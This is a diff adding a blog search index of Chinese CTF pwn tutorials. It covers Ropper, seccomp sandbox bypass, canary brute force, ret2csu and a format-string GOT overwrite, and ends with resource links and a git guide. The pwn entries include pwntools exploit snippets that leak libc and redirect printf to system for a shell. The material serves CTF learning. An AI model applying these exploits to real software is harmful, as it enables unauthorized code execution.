@@ -1,0 +1,238 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>pwn: Ropper使用</title>
+      <link href="/2025/02/27/pwn/Ropper%E4%BD%BF%E7%94%A8/"/>
+      <url>/2025/02/27/pwn/Ropper%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<h2 id="ropper"><a class="markdownIt-Anchor" href="#ropper"></a> Ropper</h2><p>Ropper是ROPgadget在大程序下的替代，有更快的检索速度，pwn手基本上都会使用</p><blockquote><p>比如在某些题目中，我们可以获得libc基址，但是程序中缺失scu等，缺少rop链的条件。迫于无奈，我们只能在libc中寻找以构造rop链，这个时候我们使用Ropper会有相当好的效果</p></blockquote><h2 id="ropper的命令"><a class="markdownIt-Anchor" href="#ropper的命令"></a> Ropper的命令</h2><h3 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装：</h3><p>我使用的是kali的wsl安装方式相当简单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install ropper</span><br></pre></td></tr></table></figure><h3 id="运行"><a class="markdownIt-Anchor" href="#运行"></a> 运行：</h3><p>直接运行ropper进入Ropper环境<br />执行file命令以载入libc文件<br /><a href="https://postimg.cc/RWRYCwP2"><img src="https://i.postimg.cc/pdbMZZKV/2025-02-27-130227.png" alt="2025-02-27-130227.png" /></a><br />在这里我使用的是本机的libc做演示</p><h3 id="命令"><a class="markdownIt-Anchor" href="#命令"></a> 命令：</h3><h5 id="gadgets命令会列出所有的gadgets实在是太多了所以一般不会这么用"><a class="markdownIt-Anchor" href="#gadgets命令会列出所有的gadgets实在是太多了所以一般不会这么用"></a> gadgets命令会列出所有的gadgets，实在是太多了，所以一般不会这么用。</h5><h5 id="search可以更加精准的查找相关的指令"><a class="markdownIt-Anchor" href="#search可以更加精准的查找相关的指令"></a> search可以更加精准的查找相关的指令</h5><p><a href="https://postimg.cc/rzfCpQc1"><img src="https://i.postimg.cc/28DH2KKK/2025-02-27-130810.png" alt="2025-02-27-130810.png" /></a><br />当然也可这样使用<br /><a href="https://postimg.cc/tsBHv0H1"><img src="https://i.postimg.cc/R0BVF9sT/2025-02-27-131331.png" alt="2025-02-27-131331.png" /></a></p><h5 id="semantic命令实现一定功能的片段"><a class="markdownIt-Anchor" href="#semantic命令实现一定功能的片段"></a> semantic命令（实现一定功能的片段）</h5><p>需要先安装依赖的库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install z3</span><br><span class="line">pip3 install archinfo</span><br><span class="line">pip3 install pyvex</span><br></pre></td></tr></table></figure><p>当然对于使用apt的linux我们使用下面的代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install python3-z3</span><br><span class="line">pip3 install --user --break-system-packages archinfo</span><br><span class="line">pip3 install --user --break-system-packages pyvex</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下面的两个是直接强制全局安装</span></span><br></pre></td></tr></table></figure><p>支持的约束命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">reg == reg     -  assign register to another</span><br><span class="line">reg == number  -  assign number to register</span><br><span class="line">reg == [reg]   -  assign memory to register</span><br><span class="line">reg += number/reg/[reg]</span><br><span class="line">reg -= number/reg/[reg]</span><br><span class="line">reg *= number/reg/[reg]</span><br><span class="line">reg /= number/reg/[reg]</span><br></pre></td></tr></table></figure><p>能跑跑小程序，大程序貌似不太跑的出来。<br />没有找到合适的效果，这里不做演示<br />实际上可以找到比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">semantic rax==0</span><br></pre></td></tr></table></figure><p>会给出xor rax rax; ret;的地址这种。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn初级 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 新手入门 </tag>
+            
+            <tag> pwn基础 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>pwn: 沙箱入门</title>
+      <link href="/2025/01/09/pwn/%E6%B2%99%E7%AE%B1%E5%85%A5%E9%97%A8/"/>
+      <url>/2025/01/09/pwn/%E6%B2%99%E7%AE%B1%E5%85%A5%E9%97%A8/</url>
+      
+        <content type="html"><![CDATA[<p>沙箱，用来控制shellcode的。在函数中会有sandbox函数。<br />我们用Newstar的一个题为例子讲解。</p><h2 id="如何查看沙箱"><a class="markdownIt-Anchor" href="#如何查看沙箱"></a> 如何查看沙箱</h2><h3 id="检测工具seccomp-tools"><a class="markdownIt-Anchor" href="#检测工具seccomp-tools"></a> 检测工具seccomp-tools</h3><h4 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装：</h4><p>sudo apt install gcc ruby-dev<br />sudo gem install seccomp-tools</p><h4 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用：</h4><p>seccomp-tools dump ./pwn<br /><a href="https://postimg.cc/7JY5dvB9"><img src="https://i.postimg.cc/KjttKxB6/2024-12-25-164132.png" alt="2024-12-25-164132.png" /></a><br />这样可以看到我们被禁止使用的函数有3个：sendfile、execve、exeveat</p><h2 id="题目例子"><a class="markdownIt-Anchor" href="#题目例子"></a> 题目例子</h2><p><a href="https://github.com/alexdkfighter/CTFblog-challenge/tree/main/shellcode/Easy_Shellcode">Easy_Shellcode</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Alex-KaliServer)-[/mnt/c/Users/Lenovo/Downloads]</span><br><span class="line">└─$ seccomp-tools dump ./Easy_Shellcode</span><br><span class="line">Welcome to Shellcode World!</span><br><span class="line"></span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0005: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0009: 0x15 0x00 0x01 0x00000101  if (A != 257) goto 0011 //openat</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x15 0x00 0x01 0x000001b5  if (A != 437) goto 0013</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0013: 0x15 0x00 0x01 0x00000000  if (A != 0) goto 0015 //read</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0015: 0x15 0x00 0x01 0x00000013  if (A != 19) goto 0017 //readv</span><br><span class="line"> 0016: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0017: 0x15 0x00 0x01 0x00000127  if (A != 295) goto 0019 //preadv</span><br><span class="line"> 0018: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0019: 0x15 0x00 0x01 0x00000147  if (A != 327) goto 0021</span><br><span class="line"> 0020: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0021: 0x15 0x00 0x01 0x00000011  if (A != 17) goto 0023 //pread64</span><br><span class="line"> 0022: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0023: 0x15 0x00 0x01 0x00000001  if (A != 1) goto 0025 //write</span><br><span class="line"> 0024: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0025: 0x15 0x00 0x01 0x00000014  if (A != 20) goto 0027 //writev</span><br><span class="line"> 0026: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0027: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure><blockquote><p>直接看系统调用表找到对应的函数（本人为了方便，已经手动添加）</p></blockquote><p>我们可以看到我们被禁用了<code>execve</code> 和 <code>execveat</code><br />所以我们只能使用ORW（open read write）来得到 flag<br />同时，程序也禁用了常规的 <code>open</code> <code>read</code> <code>write</code>，需要我们找到他们的替代品</p><ul><li>对于 <code>open</code>，我们可以选择使用 <code>openat</code> 或者 <code>openat2</code>（本题已禁用）</li><li>对于 <code>read</code>，我们可以选择使用 <code>readv</code>、<code>preadv</code>、<code>preadv2</code>（本题可用），<code>pread64</code> 或者 <code>mmap</code>（本题可用）</li><li>对于 <code>write</code>，我们可以选择使用 <code>writev</code>（本题可用），<code>sendfile</code>（本题可用，且能省略<code>read</code>）等<br />关于orw：<a href="https://downbeat.top/2024/11/14/Seccomp%E5%AD%A6%E4%B9%A0-2/">Seccomp学习(2) | D0wnBe@t</a><br />本处使用了原题解的函数openat和sendfile</li></ul><blockquote><p>如果你需要运行成功的回应，请使用root用户在根目录新建flag文件，写入一个伪造的flag即可。（大概率你以后也会用的上。）</p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn初级 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn基础 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>pwn: canary爆破</title>
+      <link href="/2024/12/27/pwn/canary%E7%88%86%E7%A0%B4/"/>
+      <url>/2024/12/27/pwn/canary%E7%88%86%E7%A0%B4/</url>
+      
+        <content type="html"><![CDATA[<h2 id="canary爆破原理"><a class="markdownIt-Anchor" href="#canary爆破原理"></a> canary爆破原理</h2><p>对于Canary，虽然每次进程重启后Canary不同，但是同一个进程中的不同线程的Cannary是相同的，并且通过fork函数创建的子进程中的canary也是相同的，因为fork函数会直接拷贝父进程的内存。而且fork在canary报错之后会重新运行，不会改变canary。<br />所以见到fork大概率是canary爆破的问题。<br />fork即子线程创建函数：</p><ul><li>在父进程中，返回新创建的子进程的PID。</li><li>在子进程中，返回0。</li><li>如果发生错误，<code>fork</code> 返回-1，父进程会获得一个负值。</li></ul><h2 id="题目示例"><a class="markdownIt-Anchor" href="#题目示例"></a> 题目示例</h2><p>我们用NewStar的题目来做示例。<a href="https://github.com/alexdkfighter/CTFblog-challenge/tree/main/canary">ezcanary</a><br /><a href="https://postimg.cc/V0q6gt2x"><img src="https://i.postimg.cc/yx5ZVXj8/2024-12-27-110419.png" alt="2024-12-27-110419.png" /></a><br />可以发现源代码中有fork，且有canary。<br />我们需要用while来反复使用fork来爆破canary。<br />所以我们用for循环，在子线程中修改canary的一个字节的值，如果修改错误，会报错，但不会影响父线程。而且有while，所以可以无限制的尝试。</p><p>在脚本中正是用aaa函数爆破一个字节的canary。<br />用bbb完成循环，爆破canary。<br />而getshell是已有的后门函数。<br />p64(0)则还是为了添加一个0x8，移动到ret。<br />当爆破完了之后，输入cat flag跳出循环。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn初级 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn基础 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>pwn: ret2csu</title>
+      <link href="/2024/12/22/pwn/ret2csu/"/>
+      <url>/2024/12/22/pwn/ret2csu/</url>
+      
+        <content type="html"><![CDATA[<p>也是今天刚搞懂，先写了再说</p><h2 id="使用的原因"><a class="markdownIt-Anchor" href="#使用的原因"></a> 使用的原因</h2><p>其实csu指的是每个程序一定会有的函数: libc_csu_init</p><p>我们以这个ctf-challenge中的例子学习<a href="https://github.com/alexdkfighter/CTFblog-challenge/tree/main/ret2csu">ret2csu</a></p><p><a href="https://postimg.cc/qgxXkVnp"><img src="https://i.postimg.cc/Kcd9Dm83/2024-12-22-150415.png" alt="libc_csu_init" /></a><br />这是IDA逆向之后的csu函数的一部分<br />也是我们所需要的部分</p><p>我们可以看到下面的pop可以帮我们控制寄存器，<br />同时，上面的mov也可以补充下面无法控制的部分寄存器</p><blockquote><p>当然，你应该也发现了我的示例里有两个脚本，exp1没有使用csu，<br />而是直接控制了寄存器，这是因为在这个示例里rdx的值足够大（大于8），也就足够输出我们需要的got表值了。如果在其他情况下，那exp1则是无效的。</p></blockquote><p>还有一点就是，我的示例里用的是我本地的libc，而不是附件里面的，如果你无法打通，请参考ret2libc相关知识，将脚本适当调整（在栈上fmt学习也用到了）</p><h2 id="控制csu泄露got表"><a class="markdownIt-Anchor" href="#控制csu泄露got表"></a> 控制csu泄露got表</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">csu1 = <span class="number">0x40061A</span></span><br><span class="line">csu2 = <span class="number">0x400600</span></span><br><span class="line">write_addr = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x88</span></span><br><span class="line">    payload += p64(csu1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu2)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_addr, <span class="number">8</span>, write_addr, <span class="number">1</span>, main_addr)</span><br></pre></td></tr></table></figure><p>r13、r14、r15根据这一部分的csu<br /><a href="https://postimg.cc/k66JTmmK"><img src="https://i.postimg.cc/rmgDFVZn/2024-12-22-154842.png" alt="2024-12-22-154842.png" /></a><br />其实就是在控制rdx、rsi、rdi，同时如果我们让rbx为0，那我们call时就自然调用的是r12的函数，也就是我设定的write<br />cmp要求我们要rbx跟rbp最后一样，否则将会再次调用，这不符合我们的预期。一开始我们让rbx为0，有个add之后我们的rbx变为了1，所以我们rbp也取1。<br />前面的b’a’是为了溢出，第二个呢？<br />第二个是因为不再次运行这个部分的程序<br /><a href="https://postimg.cc/f3XZdvjf"><img src="https://i.postimg.cc/mrpr0XPJ/2024-12-22-160513.png" alt="2024-12-22-160513.png" /></a><br />只保留retn，一共7*8个字节<br />这样我们就填充retn为我们所需要的main的地址（为了再次调用函数，我这里图省事就没再用csu了）<br />同时也输出了我们所需要的got表地址<br />进而得到libc基址</p><h2 id="最后"><a class="markdownIt-Anchor" href="#最后"></a> 最后</h2><p>后面的部分其实就是正常的使用寄存器控制参数调用system函数了，难度不高</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn初级 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn基础 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>pwn: 栈上的fmt</title>
+      <link href="/2024/12/19/pwn/%E6%A0%88%E4%B8%8Afmt%E5%AD%A6%E4%B9%A0/"/>
+      <url>/2024/12/19/pwn/%E6%A0%88%E4%B8%8Afmt%E5%AD%A6%E4%B9%A0/</url>
+      
+        <content type="html"><![CDATA[<p>今天在学fmt，觉得自己会忘记，写下这个</p><h2 id="格式化字符串对应的转义"><a class="markdownIt-Anchor" href="#格式化字符串对应的转义"></a> 格式化字符串对应的转义</h2><p>%d ：十进制，输出十进制整数<br />%s ： 字符串，从内存中读取字符串<br />%x ： 十六进制，输出十六进制数<br />%c ： 字符串，输出字符串<br />%n ： 到目前为止缩写的字符串数<br />%p ：输出指针所指的值(常用)</p><h2 id="64位的大整数覆盖地址"><a class="markdownIt-Anchor" href="#64位的大整数覆盖地址"></a> 64位的大整数覆盖地址</h2><p>我们直接从题目开始做<br /><a href="https://github.com/alexdkfighter/CTFblog-challenge/tree/main/fmt/fmt_64">fmt_64</a><br />这个文件夹里已经有我的脚本了<br />做题之前记得将libc指定为里面给的<br />我们从这个题目将栈上的fmt彻底讲完<br />该题目为2024Newstar的EZ_fmt</p><p>我们先checksec一下<br /><img src="https://i.postimg.cc/qRTzp6Vp/2024-12-19-200820.png" alt="checksec" /><br />我们发现他没有开PIE，(我们可以直接调用里面的地址)<br />RELRO也没绿 (我们可以修改got表以调用我们需要的函数)</p><p>IDA逆向查看(由于是NewStar的题，main里另外一个是纯艺术字)<br /><img src="https://i.postimg.cc/63bqnj4p/2024-12-19-201545.png" alt="IDA看代码" /><br />我们Shift+F12再看，发现没有/bin/sh字符串<br /><img src="https://i.postimg.cc/J0ynqNjc/2024-12-19-201617.png" alt="看字符串" /><br />所以我们需要自己造/bin/sh<br />题目的主函数是3次printf的fmt漏洞所以思路大概如下<br />1、第一个fmt泄露libc地址<br />2、第二个用fmt修改printf的got表，改为system的地址<br />3、输入/bin/sh，执行system(“/bin/sh”)</p><h3 id="1-泄露libc地址"><a class="markdownIt-Anchor" href="#1-泄露libc地址"></a> 1. 泄露libc地址</h3><p>这是ret2libc也常用到的方法，我们调用gdb来断点在call printf上。来确定我们要泄露的地方。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p, <span class="string">&quot;b *0x40132A&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;%p&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这时运行，程序会停在pause()。等待gdb运行，然后我们再输入c继续运行至下一个断点<br />(其实就是第一个printf的断点)，“%p”只是单纯为了跳过第一个read<br />这个时候stack 30，展开栈<br /><img src="https://i.postimg.cc/cJZBbH98/2024-12-19-205545.png" alt="stack" /><br />我们需要泄露的libc地址在0d的位置，由于是64的程序，所以还要加上6(6个寄存器)，最后的偏移是19<br />这个地址对应的函数我们需要在libc.so.6中找(但我们其实不需要知道)</p><p>vmmap查看libc的基址<br /><img src="https://i.postimg.cc/Hkbtz52g/2024-12-19-205608.png" alt="vmmap" /></p><p>差值在最后5位，地址长度为12位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.send(<span class="string">&quot;%19$p&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0xc6d90</span> + <span class="number">0x9d000</span></span><br></pre></td></tr></table></figure><p>这样的base就是每次程序运行时的libc基址</p><p>我们动调得到的libc<br /><img src="https://i.postimg.cc/nzsKsw3n/2024-12-19-215422.png" alt="libc_system" /><br />即可得到system的地址<br />system = base + 0x50d70</p><h3 id="2-构造payload修改got表"><a class="markdownIt-Anchor" href="#2-构造payload修改got表"></a> 2. 构造payload修改got表</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">low = system &amp; <span class="number">0xff</span></span><br><span class="line">hig = (system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">payload = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(low).encode() + <span class="string">b&quot;c%12$hhn&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(low-hig).encode() + <span class="string">b&quot;c%13$hn&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;printf&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;printf&#x27;</span>]+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>%hhn改动0xff的长度对应的got地址要继续写的时候是+1,如果第一个写的是%hn，那就得+2<br />至于%12$是一样的，只要ljust的时候是8的整数倍即可(因为p64)(这里由于泄露0x30，而且前面的payload为0x19)<br />如果是32位，那就应该是%6$</p><p>我们只修改got地址的后6位，(因为printf跟system的地址只差了5个，6是为了凑偶)<br />这个方式不只可以更改got，也可以改其他地方的地址</p><h3 id="3-最后"><a class="markdownIt-Anchor" href="#3-最后"></a> 3. 最后</h3><p>因为我们已经更改printf为system，我们直接传入/bin/sh即可打通<br />github上的附件是根据原题作者的wp改的，做法不同之处在于用elf直接对libc文件读取偏移，而不用单独用gdb去查看，会快一点吧</p><h2 id="小整数"><a class="markdownIt-Anchor" href="#小整数"></a> 小整数</h2><p>直接在前面加入相应个数的字符就好了</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn初级 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn基础 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ctf: 几个推荐的链接</title>
+      <link href="/2024/12/18/%E5%87%A0%E4%B8%AA%E6%8E%A8%E8%8D%90%E7%9A%84%E9%93%BE%E6%8E%A5/"/>
+      <url>/2024/12/18/%E5%87%A0%E4%B8%AA%E6%8E%A8%E8%8D%90%E7%9A%84%E9%93%BE%E6%8E%A5/</url>
+      
+        <content type="html"><![CDATA[<h2 id="复现题目"><a class="markdownIt-Anchor" href="#复现题目"></a> 复现题目:</h2><p><a href="https://ctf.xidian.edu.cn/training">NewStar</a><br />西电CTF需要装WSRX来创建动态容器<br /><a href="https://gz.imxbt.cn/games">赛事 - Review::CTF</a><br />另外：(我还没做的)</p><ul><li><a href="https://www.nssctf.cn/index">首页 | NSSCTF</a></li><li><a href="https://www.ctfhub.com/#/index">CTFHub</a></li><li><a href="https://ctf.bugku.com/">首页 - Bugku CTF平台</a></li><li><a href="https://buuoj.cn/">BUUCTF在线评测</a></li></ul><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto：</h2><p>HvAng师傅！<br /><a href="https://hvang10.github.io/2024/11/07/SageMath10-x%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E8%A3%85%E6%8C%87%E5%BC%95/">SageMath10.x最新版安装指引 | HvAng’s Nests</a><br />跟着这个就可以装SageMath了，换好源之后就不会有问题了</p><h2 id="pwn入门知识库"><a class="markdownIt-Anchor" href="#pwn入门知识库"></a> Pwn入门知识库：</h2><p><a href="https://www.yuque.com/cyberangel/rg9gdm/gcz7x2">PWN入门（1-1-1）-C函数调用过程原理及函数栈帧分析（Intel）</a><br />里面的题目附件如果是github的，建议用git直接克隆下来<br />比如wiki的ctf-challenge的附件，因为github可能会崩</p><h2 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h2><p><a href="https://ctf.bugku.com/tools.html">在线工具 - Bugku CTF平台</a></p><p>查libc (暂时替代LibcSearcher)</p><ul><li><a href="https://libcdb.dariopetrillo.it/?q=_rtld_global%3A0">libc database search</a></li><li><a href="https://libc.rip/">libc-database</a></li></ul><p>分解质因数 (暂时代替yafu)</p><ul><li><a href="http://www.factordb.com/">factordb.com</a></li></ul><p>知识库: 也就是写markdown文档建立文件体系的</p><ul><li><a href="https://forum-zh.obsidian.md/">Obsidian 中文论坛 - Obsidian 知识管理 笔记</a></li><li><a href="https://obsidian.md/">Obsidian - Sharpen your thinking</a></li></ul><p>各种语言的基本命令 (在github开源)<br /><a href="https://quickref.cn/">Qucik Reference</a></p><h2 id="最后"><a class="markdownIt-Anchor" href="#最后"></a> 最后</h2><p><strong>佬们有什么推荐的网址也可以评论告诉我的！</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 新手入门 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>sw: git入门使用</title>
+      <link href="/2024/12/18/sw/github%E4%BD%BF%E7%94%A8/"/>
+      <url>/2024/12/18/sw/github%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<h2 id="基础部分"><a class="markdownIt-Anchor" href="#基础部分"></a> 基础部分</h2><p>其实在之前也有给过推荐的一个视频<br /><a href="https://www.bilibili.com/video/BV1LT411D76z/?spm_id_from=333.337.search-card.all.click&amp;vd_source=eb45ed6f88c7bf4b9107819555b699ee">在Github上传你第一个项目【windows系统】(bilibili)</a><br />跟着这个基本就可以正常使用git的部分功能了，下面是常用的命令</p><ul><li><strong>项目初始化:</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#http克隆，也可以用github的ssh替代这里的网址</span></span><br><span class="line">git <span class="built_in">clone</span> https://example.com</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果是自己的项目，自己建的</span></span><br><span class="line">git init</span><br></pre></td></tr></table></figure><ul><li><strong>添加远程仓库</strong>:<br />将GitHub仓库添加为远程仓库。假设你仓库的URL是<code>https://github.com/username/repository.git</code>： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin https://github.com/username/repository.git</span><br></pre></td></tr></table></figure></li></ul><p>如果你是克隆自己的仓库下来的，这部分可以跳过</p><ul><li><strong>添加文件并提交</strong>:<br />将所有文件添加到git暂存区并提交: <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;Initial commit&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>推送到GitHub</strong>：<br />将本地仓库推送到GitHub的主分支 (通常是<code>main</code>): <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin main</span><br></pre></td></tr></table></figure></li></ul><h2 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#新建分支</span></span><br><span class="line">git checkout -b new_branch</span><br><span class="line"><span 